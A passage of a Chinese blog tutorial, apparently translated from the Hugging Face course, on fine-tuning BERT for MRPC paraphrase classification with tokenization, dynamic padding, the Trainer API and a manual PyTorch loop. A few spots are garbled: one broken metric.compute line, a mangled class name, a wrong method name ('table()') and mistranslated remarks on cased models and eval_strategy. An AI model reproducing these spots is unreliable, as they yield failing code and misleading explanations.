class="string">&#x27;[CLS]&#x27;</span>, <span class="string">&#x27;this&#x27;</span>, <span class="string">&#x27;is&#x27;</span>, <span class="string">&#x27;the&#x27;</span>, <span class="string">&#x27;first&#x27;</span>, <span class="string">&#x27;sentence&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;[SEP]&#x27;</span>, <span class="string">&#x27;this&#x27;</span>, <span class="string">&#x27;is&#x27;</span>, <span class="string">&#x27;the&#x27;</span>, <span class="string">&#x27;second&#x27;</span>, <span class="string">&#x27;one&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;[SEP]&#x27;</span>]</span><br><span class="line">[      <span class="number">0</span>,      <span class="number">0</span>,    <span class="number">0</span>,     <span class="number">0</span>,       <span class="number">0</span>,          <span class="number">0</span>,   <span class="number">0</span>,       <span class="number">0</span>,      <span class="number">1</span>,    <span class="number">1</span>,     <span class="number">1</span>,        <span class="number">1</span>,     <span class="number">1</span>,   <span class="number">1</span>,       <span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>如您所见，对应于<code>[CLS] sentence1 [SEP]</code>的输入部分的标记类型 ID 均为<code>0</code>，而对应于句子<code>2 [SEP]</code>的其他部分的标记类型 ID 均为<code>1</code>。</p><p>请注意，如果您选择其他检查点，则标记化输入中不一定包含<code>token_type_ids</code>（例如，如果您使用 DistilBERT 模型，则不会返回它们）。只有当模型知道如何处理它们时，才会返回它们，因为它在预训练期间已经看到了它们。</p><p>在这里，BERT 使用令牌类型 ID 进行预训练，除了我们在<a href="https://huggingface.co/course/chapter1" title="第 1 章">第 1 章</a>中讨论的掩码语言建模目标之外，它还有一个额外的目标，称为<em>下一句预测</em>。此任务的目标是对句子对之间的关系进行建模。</p><p>通过下一个句子预测，模型将获得成对的句子（带有随机掩码的标记），并要求预测第二个句子是否在第一个句子之后。为了使任务非同寻常，一半时间句子在提取它们的原始文档中彼此跟随，另一半时间这两个句子来自两个不同的文档。</p><p>一般来说，你不需要担心你的分词输入中是否有<code>token_type_ids</code>：只要你对分词器和模型使用相同的检查点，一切都会好起来的，因为分词器知道要为其模型提供什么。</p><p>现在我们已经了解了分词器如何处理一对句子，我们可以使用它来分词我们的整个数据集：就像<a href="https://huggingface.co/course/chapter2" title="上一章">上一章</a>一样，我们可以通过给分词器第一个句子的列表，然后是第二个句子的列表，给分词器一个句子对的列表。这也与我们在<a href="https://huggingface.co/course/chapter2" title="Chapter 2">Chapter 2</a>中看到的 padding 和 truncation 选项兼容。因此，预处理训练数据集的一种方法是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tokenized_dataset = tokenizer(</span><br><span class="line">    raw_datasets[<span class="string">&quot;train&quot;</span>][<span class="string">&quot;sentence1&quot;</span>],</span><br><span class="line">    raw_datasets[<span class="string">&quot;train&quot;</span>][<span class="string">&quot;sentence2&quot;</span>],</span><br><span class="line">    padding=<span class="literal">True</span>,</span><br><span class="line">    truncation=<span class="literal">True</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这很好用，但它的缺点是返回字典（包含我们的键、<code>input_ids</code>、<code>attention_mask</code>和<code>token_type_ids</code>，以及列表列表中的值）。在分词化过程中，如果您有足够的 RAM 来存储整个数据集，它也只能起作用（而 Datasets 库中的🤗数据集是存储在磁盘上的<a href="https://arrow.apache.org/" title="Apache Arrow">Apache Arrow</a>文件，因此您只将请求的样本加载到内存中）。</p><p>为了将数据保存为数据集，我们将使用<a href="https://huggingface.co/docs/datasets/package_reference/main_classes#datasets.Dataset.map" title="Dataset.map()">Dataset.map()</a>方法。如果我们需要完成更多的预处理而不仅仅是 tokenization，这也为我们提供了一些额外的灵活性。<code>map()</code>方法的工作原理是在数据集的每个元素上应用一个函数，因此让我们定义一个函数来标记我们的输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">tokenize_function</span>(<span class="params">example</span>):</span><br><span class="line">    <span class="keyword">return</span> tokenizer(example[<span class="string">&quot;sentence1&quot;</span>], example[<span class="string">&quot;sentence2&quot;</span>], truncation=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>此函数采用一个字典（就像我们数据集中的项目）并返回一个键为<code>input_ids</code>、<code>attention_mask</code>和<code>token_type_ids</code>的新字典。请注意，如果<code>示例</code>词典包含多个样本（每个键都是一个句子列表），它也有效，因为<code>分词器</code>适用于句子对列表，如前所述。这将允许我们在调用<code>map()</code>时使用选项<code>batched=True</code>，这将大大加快分词速度。<code>分词器</code>由 Tokenizers 库中用 Rust 编写的<a href="https://github.com/huggingface/tokenizers" title="🤗">🤗</a>分词器提供支持。这个分词器可以非常快，但前提是我们一次给它很多输入。</p><p>请注意，我们现在在 tokenization 函数中省略了<code>padding</code>参数。这是因为将所有样本填充到最大长度效率不高：最好在构建批次时填充样本，因为这样我们只需要填充到该批次中的最大长度，而不是整个数据集中的最大长度。当输入的长度非常可变时，这可以节省大量时间和处理能力！</p><p>以下是我们如何一次在所有数据集上应用分词函数。我们在对<code>map</code>的调用中使用了<code>batched=True</code>，因此该函数一次应用于数据集的多个元素，而不是单独应用于每个元素。这允许更快的预处理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tokenized_datasets = raw_datasets.<span class="built_in">map</span>(tokenize_function, batched=<span class="literal">True</span>)</span><br><span class="line">tokenized_datasets</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="/2025/05/01/3-%E5%BE%AE%E8%B0%83%E9%A2%84%E8%AE%AD%E7%BB%83%E6%A8%A1%E5%9E%8B/image_1fnpaz5YOo.png"></p><p>Datasets 库应用此处理的方式🤗是向数据集添加新字段，每个字段对应预处理函数返回的字典中的每个键：</p><p>你甚至可以在使用<code>map()</code>应用预处理函数时通过传递<code>num_proc</code>参数来使用 multiprocessing。我们在这里没有这样做，🤗因为 Tokenizers 库已经使用多个线程来更快地对样本进行分词，但如果您没有使用由此库支持的快速分词器，这可能会加快您的预处理速度。</p><p>我们的<code>tokenize_function</code>返回一个键为<code>input_ids</code>、<code>attention_mask</code>和<code>token_type_ids</code>的字典，因此这三个字段将添加到数据集的所有分片中。请注意，如果我们的预处理函数为我们应用<code>map()</code>的数据集中的现有 key 返回新值，我们也可以更改现有字段。</p><p>我们需要做的最后一件事是在将元素批处理在一起时将所有示例填充到最长元素的长度——这种技术我们称之为<em>动态填充</em>。</p><h2 id="2-3-动态填充"><a href="#2-3-动态填充" class="headerlink" title="2.3 动态填充"></a>2.3 动态填充</h2><p>负责将样本放在一个批次中的函数称为<em>collate 函数</em>。这是您可以在构建<code>DataLoader</code>时传递的参数，默认是一个函数，该函数只会将样本转换为 PyTorch 张量并连接它们（如果您的元素是列表、元组或字典，则递归）。在我们的例子中，这是不可能的，因为我们的输入不会都具有相同的大小。我们故意推迟了填充，仅在每个批次上根据需要应用它，并避免出现过多填充的过长输入。这将大大加快训练速度，但请注意，如果您在 TPU 上训练，它可能会导致问题——TPU 更喜欢固定的形状，即使这需要额外的填充。</p><p>为了在实践中做到这一点，我们必须定义一个 collate 函数，该函数将对我们想要一起批处理的数据集项目应用正确数量的填充。幸运的是，🤗 Transformers 库通过<code>DßataCollatorWithPadding</code>为我们提供了这样的函数。当你实例化它时，它需要一个分词器（以了解要使用哪个 padding token，以及模型期望 padding 在输入的左侧还是右侧），并且会做你需要的一切：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> DataCollatorWithPadding</span><br><span class="line">data_collator = DataCollatorWithPadding(tokenizer=tokenizer)</span><br></pre></td></tr></table></figure><p>为了测试这个新方法，让我们从训练集中获取一些样本，我们想一起批处理这些样本。在这里，我们删除了<code>idx</code>、<code>sentence1</code>和<code>sentence2</code>列，因为它们不需要并且包含字符串（而且我们不能用字符串创建张量），并查看批处理中每个条目的长度：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">samples = tokenized_datasets[<span class="string">&quot;train&quot;</span>][:<span class="number">8</span>]</span><br><span class="line">samples = &#123;k: v <span class="keyword">for</span> k, v <span class="keyword">in</span> samples.items() <span class="keyword">if</span> k <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;idx&quot;</span>, <span class="string">&quot;sentence1&quot;</span>, <span class="string">&quot;sentence2&quot;</span>]&#125;</span><br><span class="line">[<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> samples[<span class="string">&quot;input_ids&quot;</span>]]</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img src="/2025/05/01/3-%E5%BE%AE%E8%B0%83%E9%A2%84%E8%AE%AD%E7%BB%83%E6%A8%A1%E5%9E%8B/image_5qzpO1FXTV.png"></p><p>毫不奇怪，我们得到的样品长度不一，从 32 到 67 不等。动态填充意味着此批次中的样本都应填充到 67 的长度，即该批次内的最大长度。如果没有动态填充，则必须将所有样本填充到整个数据集中的最大长度，或模型可以接受的最大长度。让我们仔细检查一下我们的<code>data_collator</code>是否正确地动态填充了 batch：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">batch = data_collator(samples)</span><br><span class="line">&#123;k: v.shape <span class="keyword">for</span> k, v <span class="keyword">in</span> batch.items()&#125;</span><br></pre></td></tr></table></figure><p>看起来不错！现在我们已经从原始文本变成了我们的模型可以处理的批处理，我们准备对其进行微调！</p><hr><h1 id="3-使用Trainer-API微调模型"><a href="#3-使用Trainer-API微调模型" class="headerlink" title="3 使用Trainer API微调模型"></a>3 使用Trainer API微调模型</h1><p>🤗 Transformers 提供了一个<code>Trainer</code>类，可帮助您微调它在数据集上提供的任何预训练模型。完成上一节中的所有数据预处理工作后，您只剩下几个步骤来定义<code>Trainer</code>。最困难的部分可能是准备环境来运行<code>Trainer.train()，</code>因为它在 CPU 上运行得非常慢。如果您没有设置 GPU，您可以在<a href="https://colab.research.google.com/" title="Google Colab">Google Colab</a>上访问免费的 GPU 或 TPU。</p><p>下面的代码示例假定您已经执行了上一节中的示例。以下是您需要的简短摘要：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> datasets <span class="keyword">import</span> load_dataset</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer, DataCollatorWithPadding</span><br><span class="line"></span><br><span class="line">raw_datasets = load_dataset(<span class="string">&quot;glue&quot;</span>, <span class="string">&quot;mrpc&quot;</span>)</span><br><span class="line">checkpoint = <span class="string">&quot;bert-base-uncased&quot;</span></span><br><span class="line">tokenizer = AutoTokenizer.from_pretrained(checkpoint)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tokenize_function</span>(<span class="params">example</span>):</span><br><span class="line">    <span class="keyword">return</span> tokenizer(example[<span class="string">&quot;sentence1&quot;</span>], example[<span class="string">&quot;sentence2&quot;</span>], truncation=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tokenized_datasets = raw_datasets.<span class="built_in">map</span>(tokenize_function, batched=<span class="literal">True</span>)</span><br><span class="line">data_collator = DataCollatorWithPadding(tokenizer=tokenizer)</span><br></pre></td></tr></table></figure><h2 id="3-1-训练"><a href="#3-1-训练" class="headerlink" title="3.1 训练"></a>3.1 训练</h2><p>定义<code>Trainer</code>之前的第一步是定义一个<code>TrainingArguments</code>类，该类将包含<code>Trainer</code>将用于训练和评估的所有超参数。您必须提供的唯一参数是保存训练模型的目录，以及沿途的检查点。对于所有其他作，您可以保留默认值，这应该可以很好地进行基本的微调。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> TrainingArguments</span><br><span class="line">training_args = TrainingArguments(<span class="string">&quot;test-trainer&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>💡 如果要在训练期间自动将模型上传到中心，请在<code>TrainingArguments</code>中传递<code>push_to_hub=True</code>。我们将在<a href="https://huggingface.co/course/chapter4/3" title="第 4 章">第 4 章</a>中了解更多信息</p></blockquote><p>第二步是定义我们的模型。与<a href="https://huggingface.co/course/chapter2" title="上一章">上一章</a>一样，我们将使用具有两个标签的<code>AutoModelForSequenceClassification</code>类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoModelForSequenceClassification</span><br><span class="line">model = AutoModelForSequenceClassification.from_pretrained(checkpoint, num_labels=<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>您会注意到，与<a href="https://huggingface.co/course/chapter2" title="第 2 章">第 2 章</a>不同，在实例化此预训练模型后，您会收到一条警告。这是因为 BERT 尚未对句子对进行分类进行预训练，因此预训练模型的头部已被丢弃，而是添加了适合序列分类的新头部。警告表示某些权重未使用（与放置的预训练头对应的权重），并且其他一些权重是随机初始化的（新头的权重）。最后，它鼓励您训练模型，这正是我们现在要做的事情。</p><p>一旦有了模型，我们就可以定义一个<code>Trainer</code>，方法是将到目前为止构建的所有对象（<code>模型</code>、<code>training_args</code>、训练和验证数据集、<code>data_collator</code>和<code>分词器</code>）传递给它：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> Trainer</span><br><span class="line"></span><br><span class="line">trainer = Trainer(</span><br><span class="line">    model,</span><br><span class="line">    training_args,</span><br><span class="line">    train_dataset=tokenized_datasets[<span class="string">&quot;train&quot;</span>],</span><br><span class="line">    eval_dataset=tokenized_datasets[<span class="string">&quot;validation&quot;</span>],</span><br><span class="line">    data_collator=data_collator,</span><br><span class="line">    tokenizer=tokenizer,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>请注意，当您像我们在此处所做的那样传递<code>分词器</code>时，<code>Trainer</code>使用的默认<code>data_collator</code>将是之前定义的<code>DataCollatorWithPadding</code>，因此您可以在此调用中跳过<code>data_collator=data_collator</code>行。在第 2 节中向您展示这部分处理仍然很重要！</p><p>要在我们的数据集上微调模型，我们只需要调用<code>Trainer</code>的<code>train()</code>方法：</p><p>这将开始微调（在 GPU 上应该需要几分钟）并每 500 步报告一次训练损失。但是，它不会告诉您模型的性能如何（或差）。这是因为：</p><ol><li>我们没有告诉<code>Trainer</code>在训练期间进行评估，而是将<code>TrainingArguments</code>中的<code>eval_strategy</code>设置为<code>“steps”</code>（每<code>eval_steps</code>评估一次）或<code>“epoch”</code>（在每个 epoch 结束时评估）。</li><li>我们没有为<code>Trainer</code>提供<code>compute_metrics()</code>函数来计算所述评估期间的指标（否则评估只会打印损失，这不是一个非常直观的数字）。</li></ol><h2 id="3-2-评估"><a href="#3-2-评估" class="headerlink" title="3.2 评估"></a>3.2 评估</h2><p>让我们看看如何构建一个有用的<code>compute_metrics()</code>函数并在下次训练时使用它。该函数必须采用<code>EvalPrediction</code>对象（该对象是具有<code>predictions</code>字段和<code>label_ids</code>字段的命名元组），并将返回将字符串映射到浮点数的字典（字符串是返回的指标的名称，浮点数是其值）。要从我们的模型中获得一些预测，我们可以使用<code>Trainer.predict()</code>命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">predictions = trainer.predict(tokenized_datasets[<span class="string">&quot;validation&quot;</span>])</span><br><span class="line"><span class="built_in">print</span>(predictions.predictions.shape, predictions.label_ids.shape)</span><br></pre></td></tr></table></figure><p><code>predict()</code>方法的输出是另一个命名元组，其中包含三个字段：<code>predictions</code>、<code>label_ids</code>和<code>metrics</code>。<code>metrics</code>字段将仅包含所传递数据集的损失，以及一些时间指标（预测总时间和平均值）。完成<code>compute_metrics()</code>函数并将其传递给<code>Trainer</code>后，该字段还将包含<code>compute_metrics()</code>返回的指标。</p><p>如您所见，<code>predictions</code>是一个形状为 408 x 2 的二维数组（408 是我们使用的数据集中的元素数）。这些是我们传递给<code>predict()</code>的数据集的每个元素的 logits（正如您在<a href="https://huggingface.co/course/chapter2" title="上一章">上一章</a>中看到的，所有 Transformer 模型都返回 logits）。要将它们转换为我们可以与标签进行比较的预测，我们需要在第二个轴上获取具有最大值的索引：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">preds = np.argmax(predictions.predictions, axis=-<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>我们现在可以将这些<code>preds</code>与标签进行比较。为了构建我们的<code>compute_metric()</code>函数，我们将依赖<a href="https://github.com/huggingface/evaluate/" title="Evaluate">Evaluate</a>库中的🤗指标。我们可以像加载数据集一样轻松地加载与 MRPC 数据集相关的指标，这次使用<code>evaluate.load()</code>函数。返回的对象有一个<code>table()</code>方法，我们可以使用它来执行度量计算：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> evaluate</span><br><span class="line"></span><br><span class="line">metric = evaluate.load(<span class="string">&quot;glue&quot;</span>, <span class="string">&quot;mrpc&quot;</span>)</span><br><span class="line">metric.compute(predictions=preds, refe  rences=predictions.label_ids)</span><br></pre></td></tr></table></figure><p>您获得的确切结果可能会有所不同，因为模型头的随机初始化可能会改变它实现的指标。在这里，我们可以看到我们的模型在验证集上的准确率为 85.78%，F1 分数为 89.97。这是用于评估 GLUE 基准测试的 MRPC 数据集结果的两个指标。<a href="https://arxiv.org/pdf/1810.04805.pdf" title="BERT 论文">BERT 论文</a>中的表格报告了基本模型的 F1 分数为 88.9。这是我们目前使用<code>有外壳</code>模型时的<code>无外壳</code>模型，这解释了更好的结果。</p><p>将所有内容打包在一起，我们得到<code>compute_metrics()</code>函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">compute_metrics</span>(<span class="params">eval_preds</span>):</span><br><span class="line">    metric = evaluate.load(<span class="string">&quot;glue&quot;</span>, <span class="string">&quot;mrpc&quot;</span>)</span><br><span class="line">    logits, labels = eval_preds</span><br><span class="line">    predictions = np.argmax(logits, axis=-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> metric.compute(predictions=predictions, references=labels)</span><br></pre></td></tr></table></figure><p>为了看到它在每个 epoch 结束时报告指标的实际效果，以下是我们如何使用此<code>compute_metrics()</code>函数定义新的<code>Trainer</code>：</p><p>请注意，我们创建一个新的<code>TrainingArguments</code>，将其<code>eval_strategy</code>设置为<code>“epoch”</code>和一个新模型 — 否则，我们将继续训练我们已经训练过的模型。要启动新的训练运行，我们执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trainer.train()</span><br></pre></td></tr></table></figure><p>这一次，它将在每个 epoch 结束时报告训练损失之外的验证损失和指标。同样，由于模型的随机头部初始化，您达到的确切准确率&#x2F;F1 分数可能与我们发现的略有不同，但它应该在同一个范围内。</p><p><code>Trainer</code>将在多个 GPU 或 TPU 上开箱即用，并提供许多选项，例如混合精度训练（在训练参数中使用<code>fp16=True</code>）。我们将在第 10 章中介绍它支持的所有内容。</p><hr><h1 id="4-完整的训练过程"><a href="#4-完整的训练过程" class="headerlink" title="4 完整的训练过程"></a>4 完整的训练过程</h1><p>现在，我们将了解如何在不使用<code>Trainer</code>类的情况下获得与上一节相同的结果。同样，我们假设您已经完成了第 2 节中的数据处理。这是一个简短的摘要，涵盖了您需要的一切：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> datasets <span class="keyword">import</span> load_dataset</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer, DataCollatorWithPadding</span><br><span class="line"></span><br><span class="line">raw_datasets = load_dataset(<span class="string">&quot;glue&quot;</span>, <span class="string">&quot;mrpc&quot;</span>)</span><br><span class="line">checkpoint = <span class="string">&quot;bert-base-uncased&quot;</span></span><br><span class="line">tokenizer = AutoTokenizer.from_pretrained(checkpoint)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tokenize_function</span>(<span class="params">example</span>):</span><br><span class="line">    <span class="keyword">return</span> tokenizer(example[<span class="string">&quot;sentence1&quot;</span>], example[<span class="string">&quot;sentence2&quot;</span>], truncation=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tokenized_datasets = raw_datasets.<span class="built_in">map</span>(tokenize_function, batched=<span class="literal">True</span>)</span><br><span class="line">data_collator = DataCollatorWithPadding(tokenizer=tokenizer)</span><br></pre></td></tr></table></figure><h2 id="4-1-数据处理"><a href="#4-1-数据处理" class="headerlink" title="4.1 数据处理"></a>4.1 数据处理</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tokenized_datasets = tokenized_datasets.remove_columns([<span class="string">&quot;sentence1&quot;</span>, <span class="string">&quot;sentence2&quot;</span>, <span class="string">&quot;idx&quot;</span>])</span><br><span class="line">tokenized_datasets = tokenized_datasets.rename_column(<span class="string">&quot;label&quot;</span>, <span class="string">&quot;labels&quot;</span>)</span><br><span class="line">tokenized_datasets.set_format(<span class="string">&quot;torch&quot;</span>)</span><br><span class="line">tokenized_datasets[<span class="string">&quot;train&quot;</span>].column_names</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 dataloaders</span></span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> DataLoader</span><br><span class="line"></span><br><span class="line">train_dataloader = DataLoader(</span><br><span class="line">    tokenized_datasets[<span class="string">&quot;train&quot;</span>], shuffle=<span class="literal">True</span>, batch_size=<span class="number">8</span>, collate_fn=data_collator</span><br><span class="line">)</span><br><span class="line">eval_dataloader = DataLoader(</span><br><span class="line">    tokenized_datasets[<span class="string">&quot;validation&quot;</span>], batch_size=<span class="number">8</span>, collate_fn=data_collator</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>获取批量数据</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> batch <span class="keyword">in</span> train_dataloader:</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">&#123;k: v.shape <span class="keyword">for</span> k, v <span class="keyword">in</span> batch.items()&#125;</span><br></pre></td></tr></table></figure><h2 id="4-2-模型实现"><a href="#4-2-模型实现" class="headerlink" title="4.2 模型实现"></a>4.2 模型实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoModelForSequenceClassification</span><br><span class="line"></span><br><span class="line">model = AutoModelForSequenceClassification.from_pretrained(checkpoint, num_labels=<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>4.3 优化器和学习率调度器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> torch.optim <span class="keyword">import</span> AdamW</span><br><span class="line"></span><br><span class="line">optimizer = AdamW(model.parameters(), lr=<span class="number">5e-5</span>)</span><br></pre></td></tr></table></figure><p>默认使用的学习率调度器只是从最大值 （5e-5） 到 0 的线性衰减。为了正确定义它，我们需要知道我们将采取的训练步骤数，即我们想要运行的 epoch 数乘以训练批次数（即我们的训练数据加载器的长度）。<code>Trainer</code>默认使用三个 epoch，因此我们将遵循：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> get_scheduler</span><br><span class="line"></span><br><span class="line">num_epochs = <span class="number">3</span></span><br><span class="line">num_training_steps = num_epochs * <span class="built_in">len</span>(train_dataloader)</span><br><span class="line">lr_scheduler = get_scheduler(</span><br><span class="line">    <span class="string">&quot;linear&quot;</span>,</span><br><span class="line">    optimizer=optimizer,</span><br><span class="line">    num_warmup_steps=<span class="number">0</span>,</span><br><span class="line">    num_training_steps=num_training_steps,</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(num_training_steps)</span><br></pre></td></tr></table></figure><h2 id="4-4-训练循环"><a href="#4-4-训练循环" class="headerlink" title="4.4 训练循环"></a>4.4 训练循环</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line">device = torch.device(<span class="string">&quot;cuda&quot;</span>) <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> torch.device(<span class="string">&quot;cpu&quot;</span>)</span><br><span class="line">model.to(device)</span><br><span class="line">device</span><br></pre></td></tr></table></figure><p>添加进度条：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm.auto <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">progress_bar = tqdm(<span class="built_in">range</span>(num_training_steps))</span><br><span class="line"></span><br><span class="line">model.train()</span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(num_epochs):</span><br><span class="line">    <span class="keyword">for</span> batch <span class="keyword">in</span> train_dataloader:</span><br><span class="line">        batch = &#123;k: v.to(device) <span class="keyword">for</span> k, v <span class="keyword">in</span> batch.items()&#125;</span><br><span class="line">        outputs = model(**batch)</span><br><span class="line">        loss = outputs.loss</span><br><span class="line">        loss.backward()</span><br><span class="line"></span><br><span class="line">        optimizer.step()</span><br><span class="line">        lr_scheduler.step()</span><br><span class="line">        optimizer.zero_grad()</span><br><span class="line">        progress_bar.update(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="4-5-评估模型"><a href="#4-5-评估模型" class="headerlink" title="4.5 评估模型"></a>4.5 评估模型</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> evaluate</span><br><span class="line"></span><br><span class="line">metric = evaluate.load(<span class="string">&quot;glue&quot;</span>, <span class="string">&quot;mrpc&quot;</span>)</span><br><span class="line">model.<span class="built_in">eval</span>()</span><br><span class="line"><span class="keyword">for</span> batch <span class="keyword">in</span> eval_dataloader:</span><br><span class="line">    batch = &#123;k: v.to(device) <span class="keyword">for</span> k, v <span class="keyword">in</span> batch.items()&#125;</span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span 